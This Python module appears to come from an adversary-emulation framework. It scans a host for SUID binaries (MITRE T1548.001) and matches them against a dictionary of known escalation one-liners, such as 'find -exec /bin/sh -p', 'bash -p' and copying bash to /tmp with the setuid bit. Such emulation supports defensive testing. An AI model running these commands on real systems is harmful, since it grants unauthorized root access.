"""
campaigns/privilege_escalation/suid_hunt.py — T1548.001 Setuid and Setgid
MITRE ATT&CK: T1548.001 | Tactic: Privilege Escalation
"""

import subprocess
import json
from datetime import datetime
from campaigns.base_campaign import BaseCampaign


class SuidHuntCampaign(BaseCampaign):
    TECHNIQUE_ID = "T1548.001"
    TECHNIQUE_NAME = "Setuid and Setgid"
    TACTIC = "Privilege Escalation"

    KNOWN_SUID_EXPLOITS = {
        "find": "find / -name '*.txt' -exec /bin/sh -p \\; -quit",
        "bash": "/bin/bash -p",
        "python3": "python3 -c 'import os; os.execv(\"/bin/sh\", [\"sh\", \"-p\"])'",
        "vim": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
        "cp": "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p",
    }

    def run(self) -> dict:
        self.log_step("init", "Hunting for SUID/SGID binaries")
        suid_bins = self._find_suid_binaries()
        self.log_step("suid_scan", f"Found {len(suid_bins)} SUID binaries")
        self.simulate_delay(1)
        matches = {b: self.KNOWN_SUID_EXPLOITS[b] for b in suid_bins if b in self.KNOWN_SUID_EXPLOITS}
        self.log_step("exploit_match", f"Exploitable: {list(matches.keys())}")
        results = {
            "technique": self.TECHNIQUE_ID,
            "suid_binaries": suid_bins,
            "exploitable": matches,
            "timestamp": datetime.utcnow().isoformat(),
        }
        self.save_artifact("suid_hunt_results.json", json.dumps(results, indent=2))
        return self.build_result(True, f"Found {len(matches)} exploitable SUID binaries")

    def _find_suid_binaries(self) -> list:
        try:
            result = subprocess.run(
                ["find", "/", "-perm", "-4000", "-type", "f"],
                capture_output=True, text=True, timeout=15
            )
            bins = [line.split("/")[-1] for line in result.stdout.splitlines() if line]
            return bins if bins else ["find (simulated)", "python3 (simulated)"]
        except Exception:
            return ["find (simulated)", "python3 (simulated)"]
